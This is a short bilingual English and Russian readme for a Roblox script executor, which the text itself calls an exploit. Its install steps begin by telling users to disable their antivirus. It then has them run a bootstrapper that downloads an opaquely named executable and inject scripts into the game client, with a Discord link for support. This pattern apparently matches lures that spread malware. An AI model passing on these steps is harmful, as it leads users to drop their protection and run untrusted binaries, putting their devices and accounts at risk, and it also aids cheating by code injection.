Requests: https://dotnet.microsoft.com/en-us/download/dotnet/8.0
Translate
Нужно установить: https://dotnet.microsoft.com/en-us/download/dotnet/8.0


Step 1 - Disable your antivirus software as it can cause problems with downloading files and injecting.
Step 2 - Open the file "BootstrapperV0.4.0.exe".
Step 3 - After the downloading has finished, start "445e-1435-1244-2354-7a45.exe".
Step 4 - Create a new tab.
Step 5 - Open the Roblox app.
Step 6 - Join any Roblox game.
Step 7 - After you fully load in, click the "inject" button, paste your preferred script, and press "Execute"
Step 8 - Enjoy!
--- Thank you for using our executor.

--- Having issues, errors or want to report a bug?
Join our discord server! - discord.gg/t8VYa6bUJ7 (or click the Discord button in the executor)



Translate
#Туториал на скачку
шаг 1 - отключите свой антивирус это может вызывать проблемы при инжекте.
шаг 2 - запустите "BootstrapperV0.4.0.exe"
шаг 3 - после скачки запустите "445e-1435-1244-2354-7a45.exe".
шаг 4 - Создайте новый таб.
шаг 5 - зайдите в роблокс.
шаг 6 - зайдите в игру.
шаг 7 - после полной загрузки нажмите кнопку "Inject" вставьте скрипт и нажмите кнопку "Execute".
шаг 8 - наслаждайтесь!

появляются ошибки?
зайдите в наш дискорд сервер.
discord.gg/t8VYa6bUJ7 или кликните дискорд иконку в 445e-1435-1244-2354-7a45.exe

-- спасибо за использование нашего эксплоита!

